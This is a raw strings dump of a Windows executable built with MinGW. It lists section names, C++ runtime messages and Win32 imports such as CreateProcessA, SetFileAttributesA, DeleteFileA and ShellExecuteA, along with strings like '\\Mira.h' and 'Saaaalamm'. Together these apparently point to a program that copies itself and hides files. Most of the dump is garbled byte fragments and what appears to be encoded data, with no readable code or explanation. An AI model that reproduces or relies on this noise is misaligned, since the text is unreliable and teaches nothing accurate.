!This program cannot be run in DOS mode.
.text
.data
.rdata
@.bss
.idata
.rsrc
[^_]
D$ P
[^_]
[^_]
 t<~
Z[^_]
[^_]
[^_]
[^_]
[^_]
CUNG	
CUNG5
++C	
[^_]
CUNG5
++C	
[^_]
CUNG5
++C	
[^_]
[^_]
;] tI
M 9M
|[^_]
|[^_]
[^_]
B4CUNG
CUNG5
++C	
CUNG5
++C	
CUNG5
++C	
tD|I
L[^_]
[^_]
$$RD
\[^_]
\[^_]
t1@t@
t1@t@
t1@t@
\[^_]
\[^_]
l[^_]
l[^_]
$ RD
|[^_]
[^_]
tDBtt
=`SD
5dSD
=lRD
5pRD
5 SD
=xTD
$hTD
l[^_]
$0RD
tPBt
$0RD
tPBt
=@SD
5HSD
=tSD
$hTD
l[^_]
[^_]
$0RD
$0RD
[^_]
[^_]
[^_]
$@RD
[^_]
[^_]
8"t*
8"t-
8"t<
@$.1
C X[]
[^_]
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
AAAA
[^_]
[^_]
[^_]
[^_]
[^_]
[^_]
[^_]
[^_]
%(bD
%$bD
%0bD
%,bD
=@bD
[^_]
,0<	v
UWVS
T$Df
\$0f
|T f
|T`B
t$p1
[^_]
UWVS
|[^_]
\$ f
\TPB
t$`1
[^_]
l$$1
[^_]
D[^_]
|$l@
|$lP
	|$\
|$lO
|$lP
D[^_]
D[^_]
UWVS
d[^_]
d[^_]
d[^_]
f9t$8
UWVS
[^_]
[^_]
[^_]
%LbD
%TbD
%DbD
%HbD
%xbD
%<bD
%`bD
%lbD
%\bD
%PbD
%hbD
%|bD
t,K9
[^_]
[^_]
[^_]
[^_]
t&K9
[^_]
[^_]
[^_]
[^_]
[^_]
[^_]
[^_]
[^_]
t$H9
[^_]
t>Btm
[^_]
[^_]
t	8A%
[^_]
t	8B%
t	8B%
[^_]
t	8A%
[^_]
t	8A%
[^_]
t	8B%
t	8B%
[^_]
t	8A%
[^_]
t	8A%
t	8A%
t	8H
[^_]
<[^_]
t	9w 
t	9w
<[^_]
<[^_]
[^_]
[^_]
[^_]
[^_]
[^_]
[^_]
 [^]
<[^_]
<[^_]
,0<	wn
[^_]
U(9U
,0<	
;E |q
gfff
M(9M
[^_]
[^_]
Bl9X
|[^_]
C;]$s!
CG;]$r
[^_]
Bl9X
[^_]
Bl9X
[^_]
,A<8w4
U$-l
L$ 1
C;]$u
<[^_]
C;]$t
u!C;]$t
 [^]
[^_]
80tp
[^_]
80tp
[^_]
[^_]
[^_]
U t,
[^_]
[^_]
[^_]
\[^_]
L[^_]
l[^_]
l[^_]
|[^_]
|[^_]
l[^_]
[^_]
[^_]
[^_]
[^_]
|[^_]
|[^_]
Ix9U
\[^_]
\[^_]
|[^_]
|[^_]
|[^_]
|[^_]
|[^_]
|[^_]
|[^_]
|[^_]
|[^_]
|[^_]
[^_]
|[^_]
|[^_]
|[^_]
|[^_]
|[^_]
|[^_]
[^_]
|[^_]
|[^_]
|[^_]
|[^_]
|[^_]
|[^_]
|[^_]
[^_]
|[^_]
[^_]
[^_]
[^_]
[^_]
[^_]
[^_]
[^_]
l[^_]
[^_]
[^_]
wV)E
|[^_]
SL9C
[^_]
[^_]
t	Y[]
P4@u
[^_]
[^_]
VL9F
;:|C
Q@9A
[^_]
SL9C
WL9G
G<~?
\[^_]
\[^_]
l[^_]
\[^_]
l[^_]
\[^_]
\[^_]
\[^_]
\[^_]
\[^_]
\[^_]
\[^_]
\[^_]
\[^_]
\[^_]
\[^_]
\[^_]
P$@t
[^_]
R4@t
FG;u
[^_]
[^_]
\[^_]
\[^_]
\[^_]
\[^_]
[^_]
[^_]
[^_]
[^_]
$@RD
\[^_]
Gh;E
Gh;E
[^_]
^H[^_]
[H^_]
[^_]
[^_]
|[^_]
|[^_]
$@RD
[^_]
[^_]
[^_]
[^_]
.exe
open
\Mira.h
Saaaalamm
basic_filebuf::xsgetn error reading the file
basic_filebuf::_M_convert_to_external conversion error
basic_filebuf::underflow codecvt::max_length() is not valid
basic_filebuf::underflow incomplete character in file
basic_filebuf::underflow error reading the file
basic_filebuf::underflow invalid byte sequence in file
basic_ios::clear
basic_string::at
basic_string::copy
basic_string::compare
basic_string::_S_create
basic_string::reserve
basic_string::erase
basic_string::assign
basic_string::append
basic_string::_M_replace_aux
basic_string::replace
basic_string::insert
basic_string::resize
basic_string::_S_construct NULL not valid
basic_string::basic_string
basic_string::substr
ios_base::_M_grow_words is not valid
ios_base::_M_grow_words allocation failed
locale::_S_normalize_category category not found
locale::_Impl::_M_replace_facet
basic_string::_M_replace_aux
POSIX
%H:%M:%S
%H:%M
%m/%d/%y
basic_string::_M_replace_aux
basic_string::erase
%.0f
%.*f
pure virtual method called
LC_CTYPE
LC_NUMERIC
LC_TIME
LC_COLLATE
LC_MONETARY
LC_MESSAGES
locale::facet::_S_create_c_locale name not valid
true
false
-+xX0123456789abcdef0123456789ABCDEF
-+xX0123456789abcdefABCDEF
-0123456789
AKST
%m/%d/%y
August
September
October
November
December
%H:%M:%S
Sunday
Monday
Tuesday
Wednesday
Thursday
Friday
Saturday
January
February
March
April
June
July
c:/mnt/samo/mingw/msys/mthr_stub.c
-LIBGCCW32-EH-2-SJLJ-GTHR-MINGW32
w32_sharedptr->size == sizeof(W32_EH_SHARED)
%s:%u: failed assertion `%s'
../../gcc/gcc/config/i386/w32-shared-ptr.c
GetAtomNameA (atom, s, sizeof(s)) != 0
@INF
INITY
N10__cxxabiv117__class_type_infoE
N10__cxxabiv120__si_class_type_infoE
N10__cxxabiv121__vmi_class_type_infoE
NSt6locale5facetE
NSt8ios_base7failureE
St10bad_typeid
St10ctype_base
St10money_base
St10moneypunctIcLb0EE
St10moneypunctIcLb1EE
St11__timepunctIcE
St11logic_error
St11range_error
St12codecvt_base
St12ctype_bynameIcE
St12domain_error
St12length_error
St12out_of_range
St13bad_exception
St13basic_filebufIcSt11char_traitsIcEE
St13basic_fstreamIcSt11char_traitsIcEE
St13messages_base
St13runtime_error
St14basic_ifstreamIcSt11char_traitsIcEE
St14basic_ofstreamIcSt11char_traitsIcEE
St14codecvt_bynameIcciE
St14collate_bynameIcE
St14overflow_error
St15basic_streambufIcSt11char_traitsIcEE
St15messages_bynameIcE
St15numpunct_bynameIcE
St15time_get_bynameIcSt19istreambuf_iteratorIcSt11char_traitsIcEEE
St15time_put_bynameIcSt19ostreambuf_iteratorIcSt11char_traitsIcEEE
St15underflow_error
St16__numpunct_cacheIcE
St16invalid_argument
St17__timepunct_cacheIcE
St17moneypunct_bynameIcLb0EE
St17moneypunct_bynameIcLb1EE
St18__moneypunct_cacheIcLb0EE
St18__moneypunct_cacheIcLb1EE
St21__ctype_abstract_baseIcE
St23__codecvt_abstract_baseIcciE
St5ctypeIcE
St7codecvtIcciE
St7collateIcE
St7num_getIcSt19istreambuf_iteratorIcSt11char_traitsIcEEE
St7num_putIcSt19ostreambuf_iteratorIcSt11char_traitsIcEEE
St8bad_cast
St8ios_base
St8messagesIcE
St8numpunctIcE
St8time_getIcSt19istreambuf_iteratorIcSt11char_traitsIcEEE
St8time_putIcSt19ostreambuf_iteratorIcSt11char_traitsIcEEE
St9bad_alloc
St9basic_iosIcSt11char_traitsIcEE
St9exception
St9money_getIcSt19istreambuf_iteratorIcSt11char_traitsIcEEE
St9money_putIcSt19ostreambuf_iteratorIcSt11char_traitsIcEEE
St9time_base
St9type_info
AddAtomA
CreateDirectoryA
CreateProcessA
CreateSemaphoreA
DeleteFileA
ExitProcess
FindAtomA
GetAtomNameA
GetCommandLineA
GetLastError
GetModuleFileNameA
GetModuleHandleA
GetStartupInfoA
InterlockedDecrement
InterlockedIncrement
ReleaseSemaphore
SetFileAttributesA
SetLastError
SetUnhandledExceptionFilter
Sleep
TlsAlloc
TlsFree
TlsGetValue
TlsSetValue
WaitForSingleObject
_fdopen
_read
_strdup
_write
__getmainargs
__mb_cur_max
__p__environ
__p__fmode
__set_app_type
_assert
_cexit
_ctype
_errno
_fstati64
_iob
_isctype
_lseeki64
_onexit
_pctype
_setmode
_strnicmp
_vsnprintf
abort
atexit
fclose
fflush
fopen
fprintf
free
localeconv
malloc
memchr
memcpy
memmove
memset
rand
setlocale
setvbuf
signal
srand
strcat
strcmp
strcoll
strcpy
strftime
strlen
strtod
strxfrm
time
SHGetFolderPathA
ShellExecuteA
KERNEL32.dll
msvcrt.dll
msvcrt.dll
SHELL32.DLL
333;
333;
333;
333;
333;
333;
333;
3330
NaHaJa2
7.>`
6\zb
B>k"
2>sv
6>{v
6M>{
bM?g
2>{2
^MGg
3umx3
^6`>
%]mx7
1-mQ
@rG2
~Z)]
$FZ)]
FKBm
2,hC
<.Jw
^;<4
^;@6
A[6V
696V
c|'K
JK#6$
+?E0
6Ik]
NKj>
?.<-6y<6E
6806B<6E
$79:
&<&M
?.<J
AroE
zG(<
sbKw
V< K
A@8'
^6E6W
2(EK(@
Ab4M}
7*<$M3<
?.<-Kw
">^Kw
^M8<
&<.M
?.<J
"<!G
<COw
4J~2
	;}mV
]OwG
_Mw7
2< Ow{F
18]6
;umG$
<COw
^M2@
V>nOwkF
<CMw
:z^J=
<CMw
<CMw
'tMr
77n_
:z^J=
5)oM
nM5<
7.<J
Ai.K
<COw
<CMw
?.>nK
?.<J
m0vM
%'dE
2'dMI
.M2@r
6>aK6
m(~K
0f6e<
fMB<
2<.J
AG K
mxwr
><nG
AH F
G('d
wj_7M8'
]K(@
^Mw_
r51v
wr^Mw{
Mc8T
^G12
_a@I
smFT
-jK4>
~Kw_GB0
F>_M
?.<J
fjB<
"68>o
>aMB@
bM5<b
a@E3
2(kE
	>1t
({Mw
1>aKw
>oKv
(&G('
&K(@
B>`M
<CMw
<CMw
:z^R@
:z^R@
<CMw
<COw
^M2<b
^M2<b
R807=<
2>vK
896_>
<COw
^Kwo
^9E@
]Mw{
<COw
^Ows
]Mw{
<CMw
]6WV
2|!R
<COw
28'7M@
^Mwc
<COw
Tz4v
^Kw_
zA7K
^Mwo
]Mw{
2896
^Kwk
6k806Rz
<COw
b</C#
F80:e
.nKP>
'mK6
1>vK
896Z>
J<nM
V<nz5
<CMw
B<nz5
J<nM
V<nz5
Z45@
>Ows
xjMw{
>Ows
?.<J
xjMw{
>Ows
?.<J
xjMw{
fOws
]Mwk
fOws
]Mwk
?.<J
z`"D
^Kwk
?.<J
z`"D
^Kwk
.Mwk
(,Ows
w_Mw{
'yK6
]Mwk
6A<b
7B>|Kf
Mwo%
^Ows
xjMwo
Mwo%
^Ows
xjMwo
9Kwo
Mwo%
<COw
sbKwo
?.<J
&6A<b
J<nM
?.<J
t<.K
nc|I
^Mwo
!Mwk%
{_Gt
j^6i>
oGI0
<COw
]Kw3
]Mw3
<COw
xvMw;
676V
]Owk
<COw
xvMw;
676V
]Owk
<COw
xvMw;
676V
]Owk
<COw
xvMw;
676V
]Owk
<COw
xvMw;
676V
]Owk
<COw
xvMw;
676V
]Owk
<COw
xvMw;
676V
]Owk
<COw
xvMw;
676V
]Owk
<COw
xvMw;
676V
]Owk
<COw
jMB>
<COw
:<nK~
1(KK(@
2|!R
<CMw
<CMw
<CMw
[c9Y>
:*=M
>`KF
>`KF
xjMww
_6Z6V
5'|E*
^Kwo
1>^K
?.<J
_676X
6r<j
<COw
6r<r
<COw
6r<r
[c9Y>
:*=M
>`KF
>`KF
xjMww
_6Z6V
5'|E*
:*3M
c8%z
B>bR
26".
*6}6V
:*3M
jG('
c8%z
B>bR
26".
*6}6V
r<aE
wkmD
bOfc
^A8V
>>bJ
366!
^Kw_
2)}Mz
zbC2
<bSt>
bMwc
xjMww
2<.}1
sbK6
]MwW
64<>
0ZKw
?.>aM
]M58
4JN2
6>bL
>`Mr
2>^Kv
B>^Kv
:>_Mr
M3yb
2>bJ
:>`Mr
o>`M
B>bJ
6A<b
:>`Oz
3'hE*
]Ow7
?.<J
%YmT
smQO
]Owk
2n.'v
KF;%
nM6C
^Ko'
^KO+
2<k>
VB#v
^KGg
2kn$v
V6"v
VR"v
Vb#v
2l."v
2mV$v
VR$v
>zbDB
xjMww
'rE*
a6{6V
c]6Dz
69|!R
2>k"
<`Mw
^OwW
xvMw[
_6a6V
^Rt(KK>
<`MG
^OwW
xvMw[
_6a6V
^Rt(KK>
2n.'v
KF;%
nM6C
^Kg?
2<{R
V:#v
^KOo
2V>#v
2Vr%v
2Vn%v
qj%v
2V6"v
Vb#v
Vr#v
2kF$v
bMwo
>zbD
]Mwk
4J~2
]M4m_
s(7KF
6G((kM
<CMw
<CMw
<CMw
?.<J
^K88
?.<J
?.<J
^K88
3<UK*>
<CMw
<CMw
(89K
?:(s
RK">
<CMw
2({KN
2<<K">
0jKN
({G1'wKm<<
]K(@
2k>6
&59@
<COw
]Mw{
6:<b
2|!R
7583
2(GG
26cj
^E7{?
26cr
36s~
:>pM
8'66707
^r38'Ju
8'66707
^r38'Ju
8'66707
^r38'Ju
8'66707
^r38'Ju
AqqM9<
AqqM9<
z^bD
6I<b
z^bD
6I<b
z^bD
6I<b
?.<J
^Mw{
]Mwk
<CMw
<COw
^Mwo
]Mw{
2l.kr
6'kM
2<%z~
2<$K~
?.<J
jKJ<
+fMw
<CMw
:z^bF
:z^bF
<CMw
<CMw
?.<J
xvMw_
G]6Dz
G]6Dz
>Ows
sbK6
^Ows
xjMw{
]Mwk
>Ows
sbK6
^Ows
xjMw{
]Mwk
?.<J
xvMw_
G]6Dz
G]6Dz
>Ows
sbK6
^Ows
xjMw{
]Mwk
>Ows
sbK6
^Ows
xjMw{
]Mwk
1za:@
1za:@
1za"@
1za"@
<CMw
?.<J
xvMw_
G]6Dz
G]6Dz
>Ows
sbK6
^Ows
xjMw{
]Mwk
>Ows
sbK6
^Ows
xjMw{
]Mwk
>Ows
?.<J
>Ows
?.<J
>Ows
>Ows
?.<J
>Ows
?.<J
>Ows
K)GM
>Ows
?.<J
>Ows
?.<J
>Ows
z^2C
AiiB+
bM36
^M:8'6X
bc6x
]6[8
'qK(@
MF8f
]6W8
MF8f
|,PEm
.|!{
2>sV
J>sV
bG1(
807P<z
1<!KOs
rMOs
!K(@
7.<J
7.<J
2>lE
Z<eK
.|!R
b8';
b806
<CMw
!K(@
<CMw
B>fMw
<CMw
<CMw
<CMw
!K(@
!K(@
!K(@
!K(@
<897
>dM2<d
JM2<
2'cMz
c6x807g8'6
B>eM
G((~K
nM9>
nM9>
9<!6H6V
b897
	B<V
2b8T;
b896
2b8T
9>8T6
2<6E
6F[%
Z<eMw
'&ka
2<6E
^4B4G
2(fME806=
'{Mw
%<!Mw
;ymx
M(:O
B80K
><$K
?.<J
#<$K
B89K
#<$K
AJ G
'wKf
1'hK6
2<NM
!K(@
]6:<b
1'fK6
AilK
AiqMo3
O?I@
AiuB,
AiuB,
^Kwg
0j4'aE
Ajo(
3X'AG
Aq/Oni
AifJ
;)%G
0j4'aE
Ajo(
2>s".
Kw_I
^AV8=6!<
18]:
18T67@r
Aj_O
AjaE
K46 
{,O(
8<4D
2'xz8
K3\^
AiX;
K3\^
AiX;
VVW^
Ajh(
z,SM
[`684(
086$
Ab+E 
K5tF
0,%|4
AjoE
my86$
:1CM~
K3\^
AiX;
{,SG
'c}3
my @
K5\^
AiX;
f@%>
Kk,O
:1GMv
vVG^
^RAjo
K3\^
AiX;
^7y@
},OM
(w]7{>
AjoK
KK6G
y6]"
[`684(
AjoK	
Aj`E
},O(
e@a<G
AjoK
KK6G
[`656(
2<G}7
K4,O(
Aj_K
2<OM
Aj6K
[`684(
.<7M
.<7O
|mFt
^K(@
[`684(
2'aE
:1FMv
RAjo
[`684(
e@%6"
746"
^K(@
AH E!
897o>
Aj`O
^6]<N|6
7<<HK#4?
.hK*
2<PC
2<WC
2<PC
Aj}E!
KL6 
{,O(
Kd6 
{,O(
7<<HK#4?
]Rc|
=<<V
Aj`E
FV3^
|,SM
Aj`E
Aj`E
<8K-4A
|,SM
Aj`E
v(k'
AH (Ai8
my*6 
Aj`E
NV3^
^K\>
-bM}
myQ6M
FV3^
[`684(
	`K	4E
^K(@
<<HC
myl@
Kd6 
{,O(
K\6 
{,O(
AjxE
<<HC
'RAj
/<4C
z,SM
31lf
8<4D
z,S(
my36
my36
mym6I
<CMw
<CMw
<CMw
<CMw
<CMw
7.6^
>>nMt
nG1'
u8]7
wjz1
>>nMt
<CMw
>>nMt
<CMw
1(Sz1
 &*=E
>>nMt
<CMw
1>dM
<CMw
<CMw
<CMw
k%R4P>
694<!G
1<6M
<CMw
rM2<
wfz1
>>nMt
:>pKB
<CMw
<CMw
<CMw
<CMw
r9{>
>>nMt
<CMw
1'vO
1(Sz1
<CMw
M26F
<CMw
:>pM|
7*>eM
?.<J
<CMw
<CMw
k|QhAE
Aq G
(cMw
?.<J
jMB@
%aOw
ZM:<5M
%YmT
?.>q
%aOw
ZM2>
?.>q
0FOf
tQhAE
Aq G
N%aO
ZMD@
]Mm>
<CMw
M26F
<CMw
<CMw
:>nK6
Z|!R
:>nK6
V|!R
:>nKv
F<6M
<COw
?.<J
<CMw
:>nK6
<CMw
<CMw
:>nKv
N<6M
:>nKv
J<6M
:>nK6
<COw
?.<J
<CMw
<CMw
<COw
?.<J
<COw
?.<J
<CMw
:>nKv
B<6M
:>nK6
Z|!R
:>nK6
V|!R
:>nKv
F<6M
<COw
?.<J
<CMw
:>nK6
<CMw
<CMw
:>nKv
N<6M
:>nKv
J<6M
:>nK6
<COw
?.<J
<CMw
<CMw
<COw
?.<J
<COw
?.<J
<CMw
:>nKv
B<6M
<CMw
fK3>
<CMw
nK3>
<CMw
<CMw
vK3>
<CMw
<CMw
<CMw
~K3>
<CMw
jMt'
rMt/
jKwg
6<.E
]MwO
#Mw_
<COw
]Mw{
<CMw
<CMw
<CMw
<CMw
<CMw
<CMw
<CMw
<CMw
<CMw
4Jn2
6Mwk
xvMw;
`6I6V
]Mw3
4JN2
bMwC
w;mF
^KwO
Ai^E*
mVw9
mx26V
mx26V
^K(@
Ai^E*
mx26V
Ai^E*
]6;>
Ai^E*
^Rr@
mx26V
1806e>
]7]>
]7I>
1806
Ai^E*
mx26V
1806e>
]7]>
]7I>
3%gG
_5Ezb
]M4<r
1>`KF
]M4<r
(dMwK
1<fM
1(yMt
Ai^E*
!M4<r
tG"-
]M4<r
]MwK
]M4<r
1>`KF
]M4<r
tG4.
^KwO
Ai^E*
mVw8
mx26V
mx26V
mVw9
Ai^E*
Ai^E*
Ai^E*
smG5
JBkt
Ai^E*
Ai^E*
>806e>
]7]>
]7I>
Ai^E*
mx26V
>806e>
]7]>
]7I>
3/gG
_5Ezb
]M4<r
1>`KF
]M4<r
]K:>
1806U>
]7M>
]79z
mx26V
^OwW
>`KF
1>`KF
1>`KF
]M4<r
1>`KF
^KwO
Ai^E*
mVw9
mx26V
mx26V
^K(@
Ai^E*
mx26V
Ai^E*
]6;>
Ai^E*
^Rr@
mx26V
1806e>
]7]>
]7I>
1806
Ai^E*
mx26V
1806e>
]7]>
]7I>
JAb!
3%gG
_5Ezb
]M4<r
1>`KF
]M4<r
(dMwK
1<fM
1(yMt
Ai^E*
!M4<r
tG"-
]M4<r
]MwK
]M4<r
1>`KF
]M4<r
tG4.
^KwO
Ai^E*
mVw9
mx26V
mx26V
^K(@
Ai^E*
mx26V
Ai^E*
]6;>
Ai^E*
^Rr@
mx26V
1806e>
]7]>
]7I>
3*gG
1>`KF
Ai^E*
mx26V
1806e>
]7]>
]7I>
^Mw?
|mF=
1806L>
mx26V
r</K
1>pz1
1(~Mt
1(jM
1>`KF
]M4<r
1>`KF
]M4<r
1>`KF
]M4<r
]M4<r
1>`KF
]M4<r
1>`KF
^KwO
Ai^E*
mVw8
mx26V
mx26V
mVw9
Ai^E*
Ai^E*
Ai^E*
smG5
JBkt
]MwC
Ai^E*
mx26V
>806e>
]7]>
]7I>
^>D>
mq*>
]8fy
]Mw;
Ai^E*
mx26V
>806e>
]7]>
]7I>
]Mw;
Ab!ON
smGZ
_5Ezb
]M4<r
1>`KF
]M4<r
1<nKz
mx26V
1>oG
1(~Mt
1(jM
1>`KF
]M4<r
1>`KF
]M4<r
1>`KF
]M4<r
]M4<r
1>`KF
]M4<r
1>`KF
^KwO
Ai^E*
mVw9
mx26V
mx26V
^K(@
Ai^E*
mx26V
Ai^E*
]6;>
Ai^E*
mx26V
>806e>
]7]>
]7I>
^4D>
]Mw;
Ab%ON
smG&
>`KF
Ai^E*
mx26V
>806e>
]7]>
]7I>
]Mw;
Ab!ON
smGZ
_5Ezb
]M4<r
1>`KF
]M4<r
(dMwK
]KB<
Ai^E*
]MC806Z>
]7R>
]7>>
]M4<r
1>`KF
]M4<r
1>`KF
]M4<r
1>`KF
1>`KF
]M4<r
1>`KF
]M4<r
^KwO
wB^z1
mx26V
1>oG
'~Ms
1(vMt
1(yMt
AG F
Ai^E*
^Rr@
mx26V
Ai^E*
^MwG
Ai^E*
^K(@
Ai^E*
1806e>
]7]>
]7I>
smF4
_5Ezb
>`Mr
_5Ezb
Ai^E*
]MC<
1(~Mt
1(jM
mx26V
RAq.
^7r>
1806U>
]7M>
]79z
mx26V
VAq.
1(yMt
kumF
_5Ezb
]M4<r
1>`KF
]M4<r
1>`KF
]M4<r
]M4<r
]M4<r
1>`KF
1(yMt
Ai^E*
]6Y>
]7Q>
]7=z
AG!z1
Ai^E*
18'6e>
]7]>
,x8'
smGp
]6U>
]7M>
]79z
AG!z1
Ai^E*
1>`KF
1>_K>
]M3<j
~KwK
?.r~
~KwK
CF3r
(w`6a>dE*
mx3n`
?.<J
<!K"
<!K"
"<<K
	:<r
8r36/
8Aw>
>7S>
"<<Kv
R8]K
">_KF
"<wM
]M5<
]MB<
2)OM5@
2)OM5@
Aq!O
]M5<
]MB<
2)OM5@
2)OM5@
9/R<
N>wK>
0ZMp<
?.<J
N>wK>
N>wK>
(nKv
67S>
1|!R
1|!R
<CMw
><6M
<CMw
<COw
?.<J
<COw
?.<J
<COw
?.<J
:>nK6
:>nK6
<CMw
<CMw
:>nKv
B<6M
:>nKv
F<6M
:>nKv
J<6M
<CMw
^M6Q
1({Mt
1(wMt
1>b`
1707	k_
^M6Q
1({Mt
1(wMt
1>b`
1707	k_
><$R
]6Y>
]7Q>
AG!z1
Ai^E*
Ai6J
@rBAq
>806\>
smGp
:umF`
Ai^E*
AG!z1
Ai^E*
1>`KF
1>`KF
]M4<r
smx"
]6Y>
]7Q>
]7=z
AG!z1
Ai^E*
mx26V
4<4M
smG@
1>`KF
KwkFK
^MnQ
zOww
jM48
jMwg
]6Y>
]7Q>
AG!z1
Ai^E*
1707	k_
]6]>
]7U>
]7Az
AG!z1
Ai^E*
jMwg
smGj
uG%1
]M4<r
1>aKN
]M5<z
O6H|
806a>
]7Y>
AG!z1
Ai^E*
~M6Mmx2
<zzu
V%CR
~M4>bC
1806]>
]7U>
]7Az
AG!z1
Ai^E*
]6U>
]7M>
]79z
->b|
1<%O
1806]>
]7U>
]7Az
AG!z1
Ai^E*
1({Mt
Ai^E*
1>`KF
]M4<r
1>`KF
]M4<r
1>`KF
]M4<r
R<%K
2>b`
]MwS
^Kwo
BMwc
"Mt'
*Mt/
>896i>
]7a>
]6Y>
]7Q>
AG!z1
Ai^E*
1>z`
]KwW
289z1
mx26V
AG!z1
Ai^E*
jMw[
smGz
{bK4
1>`KF
]M5<z
1>aKN
^M>Q
]6Y>
]7Q>
]7=z
AG!z1
Ai^E*
]MNQ
smGp
	Aij
	Aij
mx26V
Aq.7U>t
8069;
srKv
1806U>
]7M>
]79z
Ai6J
nMB80
^Kw3
^KwC
1806U>
]7M>
]79z
Ai.Mx
B>^G
2)OM@@
`M8l
2)OM@@
2)OM@@
`M8m
]Mt/
1>`KF
]M4<r
mx26V
>806U>
]7M>
]79z
AG!z1
Ai^E*
]M28
1(yMt
!6|>
1806U>
]7M>
]79z
2)OM@@
`M8l
2)OM@@
`M8m
1>`KF
]M4<r
1>`KF
]M4<r
Aq.6
mx5(
2< B,
AH B+
7.7S
1	fE
2>j}
2<%7b>
1>nK
`M8m
]Mnn
<CMw
<CMw
<CMw
<CMw
Mr#!R
<CMw
u(_E
<CMw
<CMw
Mr+!R
0ZJw
!AiY
<CMw
<CMw
4J>3
^Kw?
^6J<z
1>yK
><jR
xvMwK
1806U>
]7M>
]79z
Ai^E*
1(yMt
mx26V
r</K
1>pz1
1(~Mt
1(jM
mx26V
:R8]
52kB
2'|M
1806U>
]7M>
]79z
mx26V
1>`KF
1(sM
^K(@
mx26V
mx26V
1806U>
]7M>
]79z
mx26V
mx26V
Ai^E*
Ai^E*
jMw3
mx26V
Ai^E*
1(~Mt
1(jM
1(~Mt
1(jM
`Mw{
b6G3
1(sM
^K(@
mx26V
mx26V
smGk
smGg
1806Z>
]7R>
]7>>
1(~Mt
1(jM
kumG
_5Ezb
fOw{
&6?>
.94< K~
1>`KF
]M4<r
1>`KF
]M4<r
1>`KF
]M4<r
1>`KF
]M4<r
1>`KF
]M4<r
1>`KF
]M4<r
]M4<r
1>`KF
1>`KF
]M4<r
1>`KF
1>`KF
]M4<r
1>`KF
]M4<r
1>`KF
]M4<r
4J>3
^Kw?
^6J<z
1>yK
><jR
xvMwK
1806U>
]7M>
]79z
Ai^E*
1(yMt
mx26V
r</K
1>pz1
1(~Mt
1(jM
mx26V
:R8]
52kB
2'|M
1806U>
]7M>
]79z
mx26V
1>`KF
1(sM
^K(@
mx26V
mx26V
1806U>
]7M>
]79z
mx26V
mx26V
Ai^E*
Ai^E*
jMw3
mx26V
Ai^E*
1(~Mt
1(jM
1(~Mt
1(jM
`Mw{
b6G3
1(sM
^K(@
mx26V
mx26V
smGk
smGg
1806Z>
]7R>
]7>>
1(~Mt
1(jM
kumG
_5Ezb
fOw{
&6?>
.94< K~
1>`KF
]M4<r
1>`KF
]M4<r
1>`KF
]M4<r
1>`KF
]M4<r
1>`KF
]M4<r
1>`KF
]M4<r
]M4<r
1>`KF
1>`KF
]M4<r
1>`KF
1>`KF
]M4<r
1>`KF
]M4<r
1>`KF
]M4<r
2)OM
1<.M<6
^9P>
]M4<
rMw;
]KwC
R>wK>
0ZMp<
?.<J
2)OM
1<.M<6
^9P>
4'tO
]M6;
1>gE
1>_K
mx4>
	C>s
><1C
4<V6=>
mxw7
jKN;G
>eM|
xvMwK
]Mw{
_5Ezb
]M6;
1>gE
1>_K
mx4>
	C>s
><1C
4<V6=>
mxw7
jKN;G
>eM|
xvMwK
]Mw{
_5Ezb
>z_6>
^Ows
xjc.
2<_M
]Mwg
^K8>
6<aM
6<`M
fM3<`M
0ZKwo
<<&E
]Mwo
0ZKwo
<<&E
]Ows
hOws%
bM5>
]Mwk
< Kw[
mx2< O
^Ows
>`KF
bM5>
bOwr
Ai^K(@
vAq&M
Ai^KwK
8T7S@
]Mwk
>`KF
>oKv
>aKN
^Kwk
]Mwk%
897\@
^Ows
w_Mw{
^Kwk
bOwr
8]7\@
G1'4M
$<.M
^Ows
w_Mw{
@Ai^Kwg
]Mwg
^Ows
w_Mw{
896e>
]Mwk
w_Mw{
^Kwk
r^6lz
806M>`KF
w_Mw{
]Mwg
!Mw_
>`Mz
9Kw3
c6[>
^Ow7
B>iKw
6Mwo%
;_Mw?
_7Cz
^OwG
&Mc<
]MwC
^M4>
:<nMw
K_MwO
^Kwk
]Mwk%
r^6uz
8'6}>
897h@
]Mwk
^Ows
&Kwc
_7Cz
#mxB
896]>
]Mwk
>`KF
'hK6
^MI79
f6X>
+mxB
4Ai^K
6<VM
1>dKf
'hK6
^MI79
f6X>
+mxB
4Ai^K
896]6
6<VM|
1>dKf
bM5>
^Owr%
1Mu+
Ai^K
OmPZ
fMwK
Mwc_
M4<r
mx2<
M3<j
.KwCIZm
w_Mw{
0ZKwk
8]7d@
]Mwk
G1'3M
$<.M
^Ows
&Kw_
_7Cz
M2>oK
]Mw[
.Kwk
]Mw_
>`Mz
9Kwo
sfKwk
^Ows
]Mwg
7.<J
bM3>
?.<J
^Mwk
7>8T6
8Mt+
]Mwk
7nF2
+RMwO_
7nF2
+RMwO_
^Owo
7nF2
+RMwO_
^Owo
^KwS
7nF2
^Kwc
RMwO_
^Owo
^KwS
7nF2
^Kwc
RMwO_
^Owo
>`Mz
(M:<
zOwW
]MwO
_7Cz
7nF2
+RMwO_
^Owo
^KwS
7nF2
^Kwc
RMwO_
^Owo
7nF2
+RMwO_
^Owo
>`Mz
(M:<
zOwW
]MwO
7nF2
+RMwO_
^Owo
^KwS
7nF2
^Kwc
RMwO_
^Owo
7nF2
+RMwO_
^Owo
^KwS
8M|+
:MB>
]MwS
xvMw[
:MB>
]MwG
>`Mz
:MB>
>`KF
]Mwo
]Mwg
>`Mz
9Kw3
c6[>
^Ow7
B>iKw
6Mwo%
;_Mw?
_7Cz
^OwG
&Mc<
]MwC
^M4>
:<nMw
K_MwO
^7]>
:MB>
1>`KF
xvMw[
6k6V
:MB>
:MB>
7Eyd
7Eyd
6>nM|
6>nM|
7.<J
9Kwo
sbKwk
]Mwg
1|!R
4J^2
G^KwC
:MB>
]Mw?
xvMw[
6q6V
^MwS%
7>8T6
8Mt+%
0jG1('E
xvMw[
6k6V
:MB>
:MB>
"OwW
7nB2
t(_M
mxw>
G^KwC
^Mw7
:MB>
]Mw?
xvMw[
`6>z
~7zz
M4<r
4J^2
G^KwC
^Mw;
:MB>
]Mw?
xvMw[
6q6V
>nM|
4J^2
:MB>
]Mw?
xvMw[
6q6V
>nM|
76[f6?<
4J~2
]M4>
7nB2
1>`Mz
smVwO
XM:<
]M4>
%rKF
:MB>
14"~2
PMt+
nMw;
xvMw[
`6>z
~7}z
>nM|
4J^2
G^KwC
^Mw;
:MB>
]Mw?
xvMw[
6q6V
>nM|
jM4>
4J~2
1>`Mr
FB3^
]M8>iM
4Mx+
nMwK
